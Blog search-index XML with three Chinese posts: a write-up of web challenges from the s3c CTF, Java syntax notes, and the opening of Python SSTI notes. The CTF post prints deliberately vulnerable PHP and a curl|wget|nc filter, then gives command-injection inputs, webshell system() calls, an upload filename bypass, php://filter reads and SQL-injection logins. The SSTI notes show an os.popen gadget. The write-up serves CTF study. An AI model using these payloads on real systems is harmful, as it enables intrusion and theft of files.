<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>s3c招新赛WP</title>
      <link href="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/"/>
      <url>/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<h1 id="S3c比赛WP"><a href="#S3c比赛WP" class="headerlink" title="S3c比赛WP"></a>S3c比赛WP</h1><p>[TOC]</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><hr><h3 id="EsayPHP"><a href="#EsayPHP" class="headerlink" title="EsayPHP"></a>EsayPHP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">// ‮⁦CTFer⁩⁦Hello</span><br><span class="line">if (&quot;admin&quot; == $_GET[username] &amp;‮⁦+!!⁩⁦&amp; &quot;‮⁦CTF⁩⁦s3cctf&quot; == $_GET[‮⁦S3c⁩⁦password]) &#123; //Welcome to </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>打开记事本，如下图：</p><p><img src="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp10.png"></p><p>特殊url字符匹配，去掉符号的url编码，然后按照传参数顺序即可</p><p>payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;%e2%80%ae%e2%81%a6S3c%e2%81%a9%e2%81%a6password=%e2%80%ae%e2%81%a6CTF%e2%81%a9%e2%81%a6s3cctf</span><br></pre></td></tr></table></figure><h3 id="南京殇1"><a href="#南京殇1" class="headerlink" title="南京殇1"></a>南京殇1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> $ip=$_GET[&#x27;IP&#x27;]; </span><br><span class="line"> </span><br><span class="line"> if(preg_match(&quot;/\*|\||\[|\]|\(|\)|\&#123;|\&#125;|\-/i&quot;,$ip))</span><br><span class="line">              &#123;</span><br><span class="line">                   die(&#x27; 里在干神魔? &#x27;);</span><br><span class="line">              &#125;</span><br><span class="line">if(preg_match(&quot;/eval|bash|base/im&quot;,$ip))</span><br><span class="line">              &#123;</span><br><span class="line">                   die(&#x27; ???? &#x27;);</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">               </span><br><span class="line"> system(&#x27;ping -c 2 &#x27;.$ip);</span><br><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload ：127.0.0.1&amp;ls       然后127.0.0.1&amp;cat ardiy.php</span><br></pre></td></tr></table></figure><h3 id="南京殇2"><a href="#南京殇2" class="headerlink" title="南京殇2"></a>南京殇2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">世上的事都是人堆砌起来的，又被人纷纷撇扬了去，漫不经心...浑不知这是历史。</span><br><span class="line">我行走在现在，又行走在历史，分分钟编程人人揣测的虚影子。</span><br><span class="line">笔记最后她写道 想知道我的真心么</span><br><span class="line">&lt;?php </span><br><span class="line">include(&#x27;2.php&#x27;);</span><br><span class="line">echo &#x27;&lt;br /&gt; &#x27;;</span><br><span class="line">$x=$_GET[&quot;X&quot;];</span><br><span class="line">$y=$_POST[&quot;Y&quot;];</span><br><span class="line">if(preg_match(&quot;/[a-d]|[f-z]/im&quot;,$x))</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27; 她已将真心封藏，到底多少热情的碰撞才能唤醒这份... &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;/curl|wget|nc/im&quot;,$x))</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27; no RCE  &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($x)) &#123;</span><br><span class="line">    echo $A ;</span><br><span class="line">    echo &#x27;&lt;br /&gt;&#x27;;</span><br><span class="line">&#125; </span><br><span class="line">else</span><br><span class="line">    if($x==md5($x))</span><br><span class="line">        &#123;</span><br><span class="line">            echo $C;</span><br><span class="line">            echo &#x27;&lt;br /&gt;&#x27;;</span><br><span class="line">           </span><br><span class="line">        echo $D;</span><br><span class="line">        echo &#x27;&lt;br /&gt;&#x27;;</span><br><span class="line">            if(isset($y))</span><br><span class="line">            &#123;</span><br><span class="line">                 if(preg_match(&quot;/[1-9]|[a-z]/im&quot;,$y))</span><br><span class="line">               &#123;</span><br><span class="line">                    die(&#x27; hack go away &#x27;);</span><br><span class="line">               &#125;</span><br><span class="line">                 else</span><br><span class="line">               &#123;    </span><br><span class="line">                       system(&quot;cat &quot;.$y.&quot;.php&quot;);</span><br><span class="line">               &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else &#123;echo $B;&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过代码审计可知，x的值&#x3D;&#x3D;MD5后x的值，因为是弱比较，php的特性又是0e后不加数字就截断，所以只要保证x&#x3D;0exxxx，md5（x）&#x3D;0exxxx，即可 0&#x3D;&#x3D;0，绕过！y的值先试试&#x2F;*，看到flag in 1.php！数字1又被过滤了？这…..，然后想到..&#x2F;是当前目录 ..&#x2F;**&#x2F;  又表示列出当前目录所有文件，F12读取源码即可！</p><p><img src="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp14.png"></p><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p><img src="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：111=include(&#x27;/flag.txt&#x27;);var_dump(get_defined_vars()); 这是一种命令执行姿势！</span><br><span class="line"></span><br><span class="line">​111=include(&#x27;/flag.txt&#x27;);   111=include(&#x27;/flag.txt&#x27;);echo $flag;  111=system(&#x27;cat /flag.txt&#x27;);</span><br></pre></td></tr></table></figure><h3 id="Sc网盘"><a href="#Sc网盘" class="headerlink" title="Sc网盘"></a>Sc网盘</h3><p><img src="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp5.png"></p><p>F12源码是SQL注入，并且输入用户名给出是admin，注入密码，直接万能密码</p><p><img src="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp6.png"></p><h3 id="welcome-to-s3c"><a href="#welcome-to-s3c" class="headerlink" title="welcome_to_s3c"></a>welcome_to_s3c</h3><p><img src="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp4.png"></p><p>进入的页面加载就有，直接复制即可</p><h3 id="flag给你了"><a href="#flag给你了" class="headerlink" title="flag给你了"></a>flag给你了</h3><p>让我用PUT提交一个s3c，直接BP抓包，然后通过PUT传参或者在post的位置直接输入s3c，拿到flag</p><p><img src="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp12.png"></p><p><img src="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp13.png"></p><p>题目说一半已经给了，一半你要自己找正好对应一个1ndex.php和index.php两个网页，每个一半flag！</p><p>s3c{W0w_y0U_goT_tW0_f1ags!}</p><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>题目只能上传图片类型的文件，但我们得上传一个php文件才能远程连接蚁剑！故只需要在传文件的时候BP抓包，然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改文件名为：66.PphpHP%00的url解码.jpg即可绕过</span><br></pre></td></tr></table></figure><h3 id="没有对象就new一个叭"><a href="#没有对象就new一个叭" class="headerlink" title="没有对象就new一个叭"></a>没有对象就new一个叭</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if ( isset($_GET[&quot;s3c&quot;]) &amp;&amp; isset($_GET[&quot;obj&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $s3c = $_GET[&quot;s3c&quot;];</span><br><span class="line">    $obj = $_GET[&quot;obj&quot;];</span><br><span class="line">    echo new $obj($s3c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一眼顶针，用PHP内置原生类来做</p><h6 id="步骤1："><a href="#步骤1：" class="headerlink" title="步骤1："></a>步骤1：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?obj=Filesystemlterator&amp;s3c=.(.代表当前目录)    扫描出文件f14gggggggggg.php</span><br></pre></td></tr></table></figure><h6 id="步骤2："><a href="#步骤2：" class="headerlink" title="步骤2："></a>步骤2：</h6><p>由于直接读取f14gggggggggg.php由于位数闲置读取不行，故使用伪协议！payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?obj=SplFileObject&amp;s3c=php://filter/convert.base64-encode/resource=f14gggggggggg.php</span><br></pre></td></tr></table></figure><h3 id="CTFer的礼物"><a href="#CTFer的礼物" class="headerlink" title="CTFer的礼物"></a>CTFer的礼物</h3><p><img src="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp8.png"></p><p>通过页面的名字，gift&#x3D;233，让我进入url&#x2F;get.php，页面没什么东西，F12源码看</p><p><img src="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp9.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5碰撞，这里我们采用数组直接绕过的方式：url/get.php?S3C[]=1&amp;CTF[]=2     得到flag！</span><br></pre></td></tr></table></figure><h3 id="EZpython"><a href="#EZpython" class="headerlink" title="EZpython"></a>EZpython</h3><p>让我们 nc 139.224.221.75 34251</p><p><img src="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp11.png"></p><p>一眼python命令执行，os模块输出！拿到flag</p><h3 id="解压小游戏"><a href="#解压小游戏" class="headerlink" title="解压小游戏"></a>解压小游戏</h3><p>直接查看far.js里看到源码</p><p><img src="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp15.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java语法速通</title>
      <link href="/2022/10/21/java%E8%AF%AD%E6%B3%95%E9%80%9F%E9%80%9A/"/>
      <url>/2022/10/21/java%E8%AF%AD%E6%B3%95%E9%80%9F%E9%80%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="java学习之路"><a href="#java学习之路" class="headerlink" title="java学习之路"></a>java学习之路</h1><hr><p>本视频参考22年黑马最新的java教程来参考，记录一下java速通学习之路！（菜鸡实锤），顺便敬仰Y4神！！！我的神！</p><p>[TOC]</p><h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><h4 id="1-常见的CMD命令（windows命令）"><a href="#1-常见的CMD命令（windows命令）" class="headerlink" title="1 常见的CMD命令（windows命令）"></a>1 常见的CMD命令（windows命令）</h4><ol><li>切换盘符 例如 E: </li><li>dir 显示当前目录所有文件夹（包括隐藏的）</li><li>cd 进入目录的命令   cd xxx文件夹</li><li>cd..  表示回退到上一级目录</li><li>cd 目录1\目录2\</li><li>cd \ 退到盘符目录</li><li>cls 清屏   </li><li>exit：退出命令提示符窗口</li></ol><h4 id="2-注释"><a href="#2-注释" class="headerlink" title="2 注释"></a>2 注释</h4><ol><li>单行&#x2F;&#x2F;</li><li>多行    &#x2F;*  *&#x2F;</li><li>文档  &#x2F;**   *&#x2F;</li></ol><h4 id="3-关键字"><a href="#3-关键字" class="headerlink" title="3 关键字"></a>3 关键字</h4><ol><li>全部小写</li><li>带颜色，非常直观</li><li>class关键字用来定义类，后面跟的是类名！</li></ol><h4 id="4-字面量"><a href="#4-字面量" class="headerlink" title="4 字面量"></a>4 字面量</h4><ol><li>字符串：双引号</li><li>字符：单引号（内容只能有一个）例子’A’ ‘我’</li><li>空 NULL（只能当作字符串输出）</li></ol><h4 id="5-变量"><a href="#5-变量" class="headerlink" title="5 变量"></a>5 变量</h4><p>按作用范围分类：成员变量和局部变量</p><h6 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h6><p>​在类体中定义的变量，作用范围为整个类，这个类中都可以访问到定义的这个变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class Test4_2 &#123;</span><br><span class="line">static int k = 1;   //即为成员变量---在类体中定义</span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h6><p>​在一个函数（方法）或代码块中定义的变量<br>​特点：局部变量在方法或代码块被执行的时候创建，在结束时被销毁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class Test4_2 &#123;</span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">int a = 1;</span><br><span class="line">//以下就是一个块</span><br><span class="line">&#123;</span><br><span class="line">int b = 2;</span><br><span class="line">System.out.println(&quot;a=&quot;+a);</span><br><span class="line">System.out.println(&quot;b=&quot;+b);</span><br><span class="line">&#125;</span><br><span class="line">int b = 3; //因为在上面执行结束后 代码块就被销毁了</span><br><span class="line">System.out.println(&quot;a=&quot;+a);</span><br><span class="line">System.out.println(&quot;b+&quot;+b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h6><ol><li>一条语句可以定义多个变量</li><li>变量使用前要赋值</li><li>变量名不能重复，且只能存一个值</li></ol><h2 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h2><h4 id="1-数据类型"><a href="#1-数据类型" class="headerlink" title="1 数据类型"></a>1 数据类型</h4><h6 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h6><ol><li><p>字 节——byte——1字节<br>短整型——short——2字节<br>整 型—— int ——4字节<br>长整型—— long——8字节（定义数据值后面需要+L）    <strong>以上为整型</strong><br>布尔型——boolean—1bit  （与数字无关，只有true和false）<br>单精度—— float ——4字节    浮点型数据值后面+F<br>双精度——double——8字节<br>字 符—— char ——2字节</p></li><li><p>数据类型转换</p><p>隐式转换   取值范围小的→取值范围大的（byte short int long float double）</p><p>强制转换   取值范围大的→取值范围小的（不允许直接赋值）格式：目标数据类型 变量名&#x3D;（目标数据类型）被强转的数据</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int a = 55,b = 9;</span><br><span class="line">float g,h;</span><br><span class="line">g=a/b;</span><br><span class="line">h=(float)a/b;</span><br><span class="line">System.out.println(g);   //6.0</span><br><span class="line">System.out.println(h); //6.111111</span><br></pre></td></tr></table></figure><p>byte char short三种类型计算，都会先提升为int，然后再运算。</p><h4 id="2-标识符"><a href="#2-标识符" class="headerlink" title="2 标识符"></a>2 标识符</h4><h6 id="1-定义要求-："><a href="#1-定义要求-：" class="headerlink" title="1 定义要求 ："></a>1 定义要求 ：</h6><p>​ 只能字母，数字，下划线和$符号四部分组成！不能以数字开头，不能是关键字，区分大小写。</p><h4 id="3-键盘录入"><a href="#3-键盘录入" class="headerlink" title="3 键盘录入"></a>3 键盘录入</h4><h6 id="1-导包-：Scanner"><a href="#1-导包-：Scanner" class="headerlink" title="1 导包 ：Scanner"></a>1 导包 ：Scanner</h6><p>​     import java.util.Scanner;   导包的动作必须在定义类的上边</p><h6 id="2-创建对象"><a href="#2-创建对象" class="headerlink" title="2 创建对象"></a>2 创建对象</h6><p>​Scanner sc &#x3D; new Scanner(System.in); sc为变量名，可以变，其他的都不允许变！</p><h6 id="3-接收数据"><a href="#3-接收数据" class="headerlink" title="3 接收数据"></a>3 接收数据</h6><p>​int i &#x3D; sc.nextInt();   只有i是变量名，可以变，其他的都不允许变！</p><h4 id="4-运算符"><a href="#4-运算符" class="headerlink" title="4 运算符"></a>4 运算符</h4><h6 id="1-一元运算符"><a href="#1-一元运算符" class="headerlink" title="1 一元运算符"></a>1 一元运算符</h6><p>​+&#x2F;- ——正（负）号 </p><p>​！  —— NOT，非 </p><p>​~   ——代表取补码 </p><p>​++ —— 自增运算符 </p><p>​–   —— 自减运算符</p><h6 id="2-字符串的-（可以理解为拼接）"><a href="#2-字符串的-（可以理解为拼接）" class="headerlink" title="2 字符串的+（可以理解为拼接）"></a>2 字符串的+（可以理解为拼接）</h6><p>​从左到右逐步执行，只要有字符串+，就直接拼接！</p><h6 id="3-字符相加"><a href="#3-字符相加" class="headerlink" title="3 字符相加"></a>3 字符相加</h6><p>对应的ASCII值相加，如果和字符串相加，直接拼接！</p><h6 id="4-逻辑运算符"><a href="#4-逻辑运算符" class="headerlink" title="4 逻辑运算符"></a>4 逻辑运算符</h6><p>​&amp;并且   ! 非                                                  &amp;&amp;与&amp;语法一样，但有短路作用（第一个能判断即可退出，不判断第二个）</p><p>​|或者  ^异或(同为false，不同为true)||与|语法一样，但有短路作用</p><h6 id="5-三元运算符"><a href="#5-三元运算符" class="headerlink" title="5 三元运算符"></a>5 三元运算符</h6><p>格式：关系表达式? 表达式1 : 表达式2 （true →1  false→ 2），相当于if-else</p><h2 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h2><h4 id="1-判断和循环"><a href="#1-判断和循环" class="headerlink" title="1 判断和循环"></a>1 判断和循环</h4><p>if 和if else 以及if的嵌套，switch和whlie语法和C，C++一样！建议有过C和C基础的速通一下就行。（这里笔者默认你们已经有了C或C++的基础，这里就不多说了。）</p><p>continue：跳过本次循环，执行下一次。例如：第i次跳过→i+1次开始执行</p><p>break：结束整个循环！例如：有5次循环，第3次有break，4，5次一定不执行，第3次的语句可执行，可不执行。</p><h4 id="2-数组"><a href="#2-数组" class="headerlink" title="2 数组"></a>2 数组</h4><p>​定义：一：  类型[ ] 数组名二：类型  数组名[ ]</p><p>​初始化：类型[ ] 数组名 &#x3D; new 类型[元素1，元素2……];（静态初始化）</p><p>​<strong>注意</strong>：1 数组定义时考虑数据的隐式转换，小的可以变大，大的不可以变小！</p><p>​   2 一旦定义好，长度不可改变！</p><p>一个简单的例子：创建随机数组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">package demo;</span><br><span class="line">import java.util.Random;    //导入包</span><br><span class="line">public class Tst_1 &#123;</span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">Random rand = new Random();</span><br><span class="line">int[] a = null;</span><br><span class="line">a = new int[rand.nextInt(10)]; //开辟内存空间，长度是[0，10）的随机数</span><br><span class="line">System.out.println(&quot;数组的长度：&quot;+a.length);</span><br><span class="line">for(int i=0;i&lt;a.length;i++) &#123;</span><br><span class="line">a[i] = rand.nextInt(100);</span><br><span class="line">System.out.println(&quot;a[&quot;+i+&quot;]=&quot;+a[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​数组长度输出：System.out.println(arr.length);</p><p>​数组的遍历操作（用循环） arr.fori（快速生成）</p><p>类型[ ] 数组名 &#x3D; new 类型[数据长度];（动态初始化）不给值，有默认初始值</p><p>​整数→0    小数→0.0  布尔→false  引用数据类型→null   字符→’&#x2F;u0000’（空格）</p><p>java的内存分配</p><p>栈：方法运行时使用的内存，比如main方法执行时，进入方法栈中执行</p><p>堆：存储对象或数组，new来创建的，都存储在堆内存</p><p>方法区：存储可以运行的class文件</p><p>本地方法栈：JVM在使用操作系统功能的时候使用，和我们开发无关</p><p>寄存器：给CPU使用，和我们开发无关。</p><h4 id="3-方法"><a href="#3-方法" class="headerlink" title="3 方法"></a>3 方法</h4><h6 id="1-定义：把一些代码打包在一起（程序中最小的执行单元）"><a href="#1-定义：把一些代码打包在一起（程序中最小的执行单元）" class="headerlink" title="1 定义：把一些代码打包在一起（程序中最小的执行单元）"></a>1 定义：把一些代码打包在一起（程序中最小的执行单元）</h6><h6 id="2-格式："><a href="#2-格式：" class="headerlink" title="2 格式："></a>2 格式：</h6><p>​public static 返回值类型 方法名(参数) {</p><p>​方法体；</p><p>​return 返回值；</p><p>}</p><h6 id="3-调用：-方法名（）；"><a href="#3-调用：-方法名（）；" class="headerlink" title="3 调用：  方法名（）；"></a>3 调用：  方法名（）；</h6><p>注意：1 不调用不执行</p><p>​   2 方法之间平级，顺序无所谓，但不能嵌套定义</p><h6 id="4-方法的重载"><a href="#4-方法的重载" class="headerlink" title="4 方法的重载"></a>4 方法的重载</h6><p>​定义：在同一个类中，定义了多个同名的方法，参数不同(类型，顺序，个数)</p><p>一个简单的例子，拷贝数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package demo1;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line">public class test &#123;</span><br><span class="line">public static void main(String[] args)&#123;</span><br><span class="line">       int[] arr=&#123;1,2,3,4,5,6,7,8,9&#125;;</span><br><span class="line">   int copyArr[]= copyOfRange(arr,3,7);</span><br><span class="line">    for (int i = 0; i &lt; copyArr.length; i++) &#123;</span><br><span class="line">        System.out.print(copyArr[i]+&quot; &quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    public static int[] copyOfRange(int[] arr,int from,int to) &#123;</span><br><span class="line">        int[] newArr = new int[to - from];</span><br><span class="line">        for (int i = from; i &lt; to; i++) &#123;</span><br><span class="line">            newArr[i-from]=arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        return newArr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第四天"><a href="#第四天" class="headerlink" title="第四天"></a>第四天</h2><h4 id="1-面向对象"><a href="#1-面向对象" class="headerlink" title="1 面向对象"></a>1 面向对象</h4>]]></content>
      
      
      <categories>
          
          <category> 编程语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python SSTI学习</title>
      <link href="/2022/10/16/Python-SSTI%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/10/16/Python-SSTI%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-SSTI"><a href="#Python-SSTI" class="headerlink" title="Python SSTI"></a>Python SSTI</h1><p>太菜了，并没有接触过ssti，这边由于过了python的语法，所以略带yi点点基础学习SSTI注入！但依旧看不懂，所以做做笔记和练习题来加深对此的理解！芜湖，加油！</p><h4 id="1-前置基础"><a href="#1-前置基础" class="headerlink" title="1 前置基础"></a>1 前置基础</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">1 __class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">2 __base__             类型对象的直接基类</span><br><span class="line">3 __bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">4 __mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">5 __subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line"></span><br><span class="line">6 __init__             初始化类，返回的类型是function</span><br><span class="line">7 __globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">8 __dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">9 __getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line"></span><br><span class="line">10 __getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">11 __builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line"></span><br><span class="line">12 __import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">13 __str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">14 url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">15 get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line"></span><br><span class="line">16 lipsum               